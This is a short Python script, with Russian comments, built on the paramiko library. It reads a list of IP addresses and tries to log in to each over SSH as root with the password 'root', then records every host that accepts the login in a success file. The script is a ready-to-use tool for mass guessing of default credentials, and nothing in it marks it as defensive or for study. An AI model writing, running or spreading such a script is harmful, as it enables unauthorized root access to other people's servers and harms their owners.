import paramiko

# Загрузка IP-адресов
with open("ips/ssh_ips.txt", "r") as f:
    ips = [line.strip() for line in f if line.strip()]

# Учетные данные
username = "root"
password = "root"

# Настройки SSH-клиента
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Файл для успешных попыток
with open("success/ssh_success.txt", "a") as success_file:
    for ip in ips:
        try:
            print(f"[.] Пробую {ip} ...")
            ssh.connect(hostname=ip, port=22, username=username, password=password, timeout=5)
            print(f"[+] УСПЕШНО: {ip} — SSH доступен с root:root")
            success_file.write(ip + "\n")
            ssh.close()
        except paramiko.AuthenticationException:
            print(f"[-] ОТКАЗ: {ip} — неправильный логин/пароль")
        except paramiko.SSHException as e:
            print(f"[!] SSH ошибка на {ip}: {e}")
        except Exception as e:
            print(f"[!] Ошибка подключения к {ip}: {e}")
